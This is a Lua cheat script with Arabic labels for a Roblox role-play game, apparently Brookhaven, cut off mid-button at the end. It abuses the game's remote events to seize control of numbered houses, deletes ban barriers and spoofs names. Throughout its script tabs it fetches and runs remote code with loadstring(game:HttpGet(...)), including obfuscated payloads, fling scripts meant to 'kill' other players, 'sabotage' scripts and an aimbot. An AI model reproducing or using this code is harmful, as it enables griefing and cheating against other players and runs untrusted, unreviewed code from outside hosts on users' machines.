local Main = MakeTab({Name = "البيت"})
Paragraph = AddParagraph(Main, {"هنا تقدر تشيل الطرد"})
AddTextBox(Main, {
    Name = "اسم",
    Default = "",
    PlaceholderText = "اكتب اسمك اهنا",
    Callback = function(value)
        local args = {
            [1] = "BusinessName",
            [2] = value
        }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1RPHous1eEven1t"):FireServer(unpack(args))
    end
})
AddToggle(Main, {
    Name = "الغاء حظر عن بيت",
    Default = false,
    Callback = function(state)
        isUnbanActive = state
        if isUnbanActive then
            print(".")
            startAutoUnban()
        else
            print("تم فك الحظر")
        end
    end
})
function startAutoUnban()
    while isUnbanActive do
        for i, v in pairs(game:GetService("Workspace"):WaitForChild("001_Lots"):GetDescendants()) do
            -- houses
            if v.Name == "BannedBlock1" or v.Name == "BannedBlock2" or v.Name == "BannedBlock3" or v.Name == "BannedBlock4" or v.Name == "BannedBlock5" or v.Name == "BannedBlock6" or v.Name == "BannedBlock7" or v.Name == "BannedBlock11" or v.Name == "BannedBlock12" or v.Name == "BannedBlock13" or v.Name == "BannedBlock14" or v.Name == "BannedBlock15" or v.Name == "BannedBlock16" or v.Name == "BannedBlock17" or v.Name == "BannedBlock18" or v.Name == "BannedBlock19" or v.Name == "BannedBlock20" or v.Name == "BannedBlock21" or v.Name == "BannedBlock21" or v.Name == "BannedBlock22" or v.Name == "BannedBlock23" or v.Name == "BannedBlock24" or v.Name == "BannedBlock30" or v.Name == "BannedBlock31" or v.Name == "BannedBlock32" or v.Name == "BannedBlock33" or v.Name == "BannedBlock34" or v.Name == "BannedBlock35" then                -- destroy
                v:Destroy()
            end
        end
wait(1)
    end
end
Paragraph = AddParagraph(Main, {"اوامر البيت"})
AddButton(Main, {
  Name = " فتح و غلق الكراج  ",
  Callback = function()
					local args = {
						[1] = "GarageDoor"
					}
					game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Player1sHous1e"):FireServer(unpack(args))
end
})




AddButton(Main, {
  Name = " غلق و فتح الشباك  ",
  Callback = function()
					local args = {
						[1] = "Curtains"
					}
					game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Player1sHous1e"):FireServer(unpack(args))
end
})




AddButton(Main, {
  Name = "احذف بيتك",
  Callback = function()
  local args = {
    [1] = "PlayerSellHouse"
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Player1sHous1eChoic1e"):FireServer(unpack(args))

  end
})
AddButton(Main, {
  Name = " فتح قفل الباب",
  Callback = function() 
  local args = {
    [1] = "LockDoors"
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Player1sHous1e"):FireServer(unpack(args))


  end
})
AddButton(Main, {
  Name = " قفل الباب",
  Callback = function()
  local args = {
    [1] = "LockDoors"
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Player1sHous1e"):FireServer(unpack(args))

  end
})
AddButton(Main, {
  Name = "تغير الوان بيتك ",
  Callback = function()
    local colors = {
      Color3.fromRGB(255, 0, 0),     
      Color3.fromRGB(255, 127, 0),   
      Color3.fromRGB(255, 255, 0),  
      Color3.fromRGB(0, 255, 0),   
      Color3.fromRGB(0, 0, 255),     
      Color3.fromRGB(75, 0, 130),    
      Color3.fromRGB(148, 0, 211)    
    }

    local remote = game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Player1sHous1e")

   
    while true do
      for _, color in ipairs(colors) do
        local args = {
          [1] = "ColorPickHouse",
          [2] = color
        }
        remote:FireServer(unpack(args))
        wait(0.5)
      end
    end
  end
})
Paragraph = AddParagraph(Main, {"تحكم البيوت"})
AddButton(Main, {
  Name = "1 تاخذ تحكم البيت ",
  Callback = function()
    local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 1
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  end
})
AddButton(Main, {
  Name = "2 تاخذ تحكم البيت ",
  Callback = function()
    local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 2
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  end
})
AddButton(Main, {
  Name = "3 تاخذ تحكم البيت ",
  Callback = function()
    local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 3
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  end
})
AddButton(Main, {
  Name = "4 تاخذ تحكم البيت ",
  Callback = function()
    local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 4
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  end
})
AddButton(Main, {
  Name = "5 تاخذ تحكم البيت ",
  Callback = function()
    local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 5
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  end
})
AddButton(Main, {
  Name = "6 تاخذ تحكم البيت ",
  Callback = function()
    local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 6
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  end
})
AddButton(Main, {
  Name = "7 تاخذ تحكم البيت ",
  Callback = function()
    local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 7
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  end
})
AddButton(Main, {
  Name = "11 تاخذ تحكم البيت ",
  Callback = function()
    local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 11
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  end
})
AddButton(Main, {
  Name = "12 تاخذ تحكم البيت ",
  Callback = function()
    local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 12
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  end
})
AddButton(Main, {
  Name = "13 تاخذ تحكم البيت ",
  Callback = function()
    	local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 13
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  end
})
AddButton(Main, {
  Name = "14 تاخذ تحكم البيت ",
  Callback = function()
    local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 14
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  end
})
AddButton(Main, {
  Name = "15 تاخذ تحكم البيت ",
  Callback = function()
    local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 15
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  end
})
AddButton(Main, {
  Name = "16 تاخذ تحكم البيت ",
  Callback = function()
    local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 16
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  end
})
AddButton(Main, {
  Name = "17 تاخذ تحكم البيت ",
  Callback = function()
    local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 17
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  end
})
AddButton(Main, {
  Name = "18 تاخذ تحكم البيت ",
  Callback = function()
    local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 18
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  end
})
AddButton(Main, {
  Name = "19 تاخذ تحكم البيت ",
  Callback = function()
    local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 19
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "20 تاخذ تحكم البيت ",
  Callback = function()
    local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 20
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  end
})
AddButton(Main, {
  Name = "21 تاخذ تحكم البيت ",
  Callback = function()
    local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 21
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  end
})
AddButton(Main, {
  Name = "22 تاخذ تحكم البيت ",
  Callback = function()
    local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 22
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  end
})
AddButton(Main, {
  Name = "23 تاخذ تحكم البيت ",
  Callback = function()
    local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 23
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "24 تاخذ تحكم البيت ",
  Callback = function()
    local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 24
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))	
  end
})
AddButton(Main, {
  Name = " تاخذ تحكم بيت  25",
  Callback = function()
  local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 25
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "تاخذ تحكم بيت 26",
  Callback = function()
  local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 26
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "تاخذ تحكم بيت 27",
  Callback = function()
  local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 27
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "تاخذ تحكم بيت 28",
  Callback = function()
  local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 28
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "تاخذ تحكم بيت 29",
  Callback = function()
  local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 29
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "تاخذ تحكم بيت 30",
  Callback = function()
  local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 30
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "تاخذ تحكم بيت 31",
  Callback = function()
  local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 31
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "تاخذ تحكم بيت 33",
  Callback = function()
  local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 33
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "تاخذ تحكم بيت 34",
  Callback = function()
  local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 34
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = " تاخذ تحكم بيت 35",
  Callback = function()
  local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 35
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "تاخذ تحكم بيت 36",
  Callback = function()
  local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 36
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "تاخذ تحكم بيت 37",
  Callback = function()
  local args = {
    [1] = "GivePermissionLoopToServer",
    [2] = game:GetService("Players").LocalPlayer,
    [3] = 37
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))
  end
})
local Main = MakeTab({Name = "السكربتات"})
AddSection(Main, {"اسم السكربت في البحث TrollX"})
AddButton(Main, {
  Name = "سكربت المطور Troll-X",
  Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ahmidd409/TrollX-V2/refs/heads/main/TrollX40%2540%25409%25409%25409%25409%25409"))()
  end
})
AddSection(Main, {"سكربتات مفيدة"})
AddButton(Main, {
  Name = "سكربت ايمبوت",
  Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/HomeMadeScripts/Camlock-aimlock/main/obf_Wxr6QgzF76G1y2Ch77KN4Zt5Nz0A6GIl61gitv3mRR2t3V103al5d0g26s4KY04r.lua.txt"))()
end
})
AddButton(Main, {
  Name = "سكربت طيران سيارات",
  Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ahmidd409/TrollX-V2/refs/heads/main/TrollXVfly.txt"))()
end
})
AddButton(Main, {
  Name = "سكربت طيران",
  Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ahmidd409/Orion/refs/heads/main/%D8%B3%D9%83%D8%B1%D8%A8%D8%AA%D9%8A%20%D9%85%D8%A7%D9%84%20%D8%B7%D9%8A%D8%B1%D8%A7%D9%86"))()
end
})
AddButton(Main, {
  Name = "سكربت يسوي فلنق للسيارات",
  Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ahmidd409/TrollX-V2/refs/heads/main/Vfly_TrollX.txt"))()
end
})
AddButton(Main, {
  Name = "سكربت شفت لوك ينطيك قفل شاشة",
  Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Sector9922/SECTOR-SHIFT-LOCK/main/SECTOR%20SHIFT%20LOCK"))()
end
})
AddSection(Main, {"سكربتات اجنبية"})

AddButton(Main, {
  Name = "سكربت مشيات",
  Callback = function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-AFEM-14048"))()
end
})
AddButton(Main, {
  Name = "سكربت R4D",
  Callback = function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/M1ZZ001/BrookhavenR4D/main/Brookhaven%20R4D%20Script'))()
end
})
AddButton(Main, {
  Name = "سكربت روجيبس لجميع المابات",
  Callback = function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-rochips-universal-18294"))()
end
})
AddButton(Main, {
  Name = "سكربت تخريب",
  Callback = function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-New-Update-24681"))()
  end
})
AddButton(Main, {
  Name = "سكربت الهلال | Scrpit Atomic",
  Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/n0kc/AtomicHub/main/Map-Al-Biout.lua"))()
  end
})
AddButton(Main, {
  Name = "سكربت SanderX",
  Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/sXPiterXs1111/Sanderx3.25/main/sanderxv3.25.lua"))()
  end
})
AddButton(Main, {
  Name = "سكربت رحمة",
  Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/n0kc/AtomicHub/main/Map-Al-Biout.lua"))()
  end
})
AddButton(Main, {
  Name = "سكربت R4D",
  Callback = function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/M1ZZ001/BrookhavenR4D/main/Brookhaven%20R4D%20Script'))()
  end
})
AddButton(Main, {
  Name = "سكربت RealHub",
  Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Laelmano24/Rael-Hub/main/main.txt"))()
  end
})
AddButton(Main, {
  Name = "سكربت تخريب",
  Callback = function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/TheDarkoneMarcillisePex/Other-Scripts/main/Brook%20Haven%20Gui'))()
  end
})
AddButton(Main, {
  Name = "سكربت Premium",
  Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/gjQUGX/DXVUSEW/refs/heads/main/Sunterium-Hub/DELTA"))()
  end
})
AddButton(Main, {
  Name = "سكربت Mango",
  Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/rogelioajax/lua/main/MangoHub", true))()
  end
})
AddButton(Main, {
  Name = "سكربت شادو",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/realgengar/Brookhaven/refs/heads/main/Source.lua"))()
  end
})
AddButton(Main, {
  Name = "سكربت Universal",
  Callback = function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-rochips-universal-18294"))()
  end
})
local Main = MakeTab({Name = "سكربتات الصملة"})
AddButton(Main, {
  Name = "سكربت يقتل الناس بالقنفة",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Fling%20GUI"))()
  end
})

AddButton(Main, {
  Name = "سكربت يطير او يقتل اي احد يطيرك",
  Callback = function()
loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-FE-Fling-GUI-10927"))()
  end
})

AddButton(Main, {
  Name = "سكربت محد يكدر يطيرك",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/zephyr10101/ignore-touchinterests/main/main",true))() 
  end
})
AddButton(Main, {
  Name = "سكربت Infinity Yield ",
  Callback = function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
  end
})
AddButton(Main, {
  Name = "سكربت تخريب",
  Callback = function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/TheDarkoneMarcillisePex/Other-Scripts/main/Brook%20Haven%20Gui'))()
  end
})
AddButton(Main, {
  Name = "سكربت رحمة",
  Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/n0kc/AtomicHub/main/Map-Al-Biout.lua"))()
  end
})
AddButton(Main, {
  Name = "سكربت يسوي فلنق للسيارات",
  Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ahmidd409/TrollX-V2/refs/heads/main/Vfly_TrollX.txt"))()
end
})
local Main = MakeTab({Name = "سكربتاتي"})
local Paragraph = AddParagraph(Main, {"للاسف ماعندي سكربتات هواي بس سكربتات صديقي رح تعوض", "bom dia meus manos"})
AddSection(Main, {"سكربتاتي"})
AddButton(Main, {
  Name = "سكربتي الطيران",
  Callback = function()
loadstring(game:HttpGet(("https://raw.githubusercontent.com/mhmdsx/FlyTrunksHub/refs/heads/main/Protected_1335443716952436.lua.txt")))()
  end
})
AddSection(Main, {"سكربتات صديقي Trollx"})
AddButton(Main, {
  Name = "سكربت نسخ سكنات",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ahmidd409/-/refs/heads/main/CopyAvatar.txt"))()
  end
})
AddButton(Main, {
  Name = "سكربت طيران سيارة",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ahmidd409/TrollX-V2/refs/heads/main/Vfly_TrollX.txt"))()
  end
})
AddButton(Main, {
  Name = "سكربت اغاني",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ahmidd409/TrollX-V2/refs/heads/main/MusicTrollX.txt"))()
  end
})
AddButton(Main, {
  Name = "سكربت التدمير",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ahmidd409/TrollX-V2/refs/heads/main/HackerBrookhaven_TrollX.txt"))()
  end
})
local Main = MakeTab({Name = "الأسماء"})


AddSection(Main, {"الاسم"})


AddTextBox(Main, {
Name = "الاسم",
Default = "",
PlaceholderText = "ضع الاسم",
ClearText = true,
Callback = function(value)
local args = {[1] = "RolePlayName", [2] = value};
        game:GetService("ReplicatedStorage").RE:FindFirstChild(
            "1RPNam1eTex1t"):FireServer(unpack(args));
    end
})

-- Variáveis para rastrear os estados dos toggles
local isNameActive = false
local isBioActive = false

-- Toggle para ativar/desativar o RGB Name
Toggle = AddToggle(Main, {
Name = "تلوين الاسم",
Default = false,
Callback = function(value)
isNameActive = value -- Define o estado baseado no toggle
        if isNameActive then
            print("RGB Name ativado")
        else
            print("RGB Name desativado")
        end
    end    
})

AddSection(Main, {"البايو"})

AddTextBox(Main, {
Name = "البايو",
Default = "",
PlaceholderText = "ضع البايو",
ClearText = true,
Callback = function(value)
     local args = {[1] = "RolePlayBio", [2] = value};
        game:GetService("ReplicatedStorage").RE:FindFirstChild(
            "1RPNam1eTex1t"):FireServer(unpack(args));
    end
})

-- Toggle para ativar/desativar o RGB BIO
Toggle = AddToggle(Main, {
Name = "تلوين البايو",
Default = false,
Callback = function(value)
isBioActive = value -- Define o estado baseado no toggle
        if isBioActive then
            print("RGB BIO ativado")
        else
            print("RGB BIO desativado")
        end
    end    
})

-- Thread separada para o RGB Name
spawn(function()
    local vibrantColors = {
        Color3.fromRGB(255, 0, 0),   -- Vermelho
        Color3.fromRGB(0, 255, 0),   -- Verde
        Color3.fromRGB(0, 0, 255),   -- Azul
        Color3.fromRGB(255, 255, 0), -- Amarelo
        Color3.fromRGB(255, 0, 255), -- Magenta
        Color3.fromRGB(0, 255, 255), -- Ciano
        Color3.fromRGB(255, 165, 0), -- Laranja
        Color3.fromRGB(128, 0, 128), -- Roxo
        Color3.fromRGB(255, 20, 147) -- Rosa choque
    }

    while true do
        if isNameActive then
            local randomColor = vibrantColors[math.random(#vibrantColors)]
            local args = {
                [1] = "PickingRPNameColor",
                [2] = randomColor
            }
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1RPNam1eColo1r"):FireServer(unpack(args))
        end
        wait(0.7) -- Ajuste o tempo de espera conforme necessário
    end
end)

-- Thread separada para o RGB BIO
spawn(function()
    local vibrantColors = {
        Color3.fromRGB(255, 0, 0),   -- Vermelho
        Color3.fromRGB(0, 255, 0),   -- Verde
        Color3.fromRGB(0, 0, 255),   -- Azul
        Color3.fromRGB(255, 255, 0), -- Amarelo
        Color3.fromRGB(255, 0, 255), -- Magenta
        Color3.fromRGB(0, 255, 255), -- Ciano
        Color3.fromRGB(255, 165, 0), -- Laranja
        Color3.fromRGB(128, 0, 128), -- Roxo
        Color3.fromRGB(255, 20, 147) -- Rosa choque
    }

    while true do
        if isBioActive then
            local randomColor = vibrantColors[math.random(#vibrantColors)]
            local args = {
                [1] = "PickingRPBioColor",
                [2] = randomColor
            }
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1RPNam1eColo1r"):FireServer(unpack(args))
        end
        wait(0.7) -- Ajuste o tempo de espera conforme necessário
    end
end)
AddSection(Main, {"اسماء اولاد"})
AddButton(Main, {
  Name = "محمد",
  Callback = function()
local args = {
    [1] = "RolePlayName",
    [2] = "محمد"
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "احمد",
  Callback = function()
local args = {
    [1] = "RolePlayName",
    [2] = "احمد"
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "علي",
  Callback = function()
local args = {
    [1] = "RolePlayName",
    [2] = "علي"
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "قاسم",
  Callback = function()
local args = {
    [1] = "RolePlayName",
    [2] = "قاسم"
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "عباس",
  Callback = function()
local args = {
    [1] = "RolePlayName",
    [2] = "عباس"
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "محمود",
  Callback = function()
local args = {
    [1] = "RolePlayName",
    [2] = "محمود"
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "جواد",
  Callback = function()
local args = {
    [1] = "RolePlayName",
    [2] = "جواد"
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "عماد",
  Callback = function()
local args = {
    [1] = "RolePlayName",
    [2] = "عماد"
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "عبدالله",
  Callback = function()
local args = {
    [1] = "RolePlayName",
    [2] = "عبدالله"
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "مراد",
  Callback = function()
local args = {
    [1] = "RolePlayName",
    [2] = "مراد"
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "عليوي",
  Callback = function()
local args = {
    [1] = "RolePlayName",
    [2] = "عليوي"
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "عبوسي",
  Callback = function()
local args = {
    [1] = "RolePlayName",
    [2] = "عبوسي"
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "عبيس",
  Callback = function()
local args = {
    [1] = "RolePlayName",
    [2] = "عبيس"
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "عمر",
  Callback = function()
local args = {
    [1] = "RolePlayName",
    [2] = "عمر"
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "جاسم",
  Callback = function()
local args = {
    [1] = "RolePlayName",
    [2] = "جاسم"
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddSection(Main, {"اسماء بنات"})
AddButton(Main, {
  Name = "لين",
  Callback = function()
local args = {
    [1] = "RolePlayName",
    [2] = "لين"
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "ايلين",
  Callback = function()
local args = {
    [1] = "RolePlayName",
    [2] = "ايلين"
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "نيفين",
  Callback = function()
local args = {
    [1] = "RolePlayName",
    [2] = "نيفين"
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "رقية",
  Callback = function()
local args = {
    [1] = "RolePlayName",
    [2] = "رقية"
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "زينب",
  Callback = function()
local args = {
    [1] = "RolePlayName",
    [2] = "زينب"
}

game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "سونا",
  Callback = function()
local args = {
    [1] = "RolePlayName",
    [2] = "سونا"
}

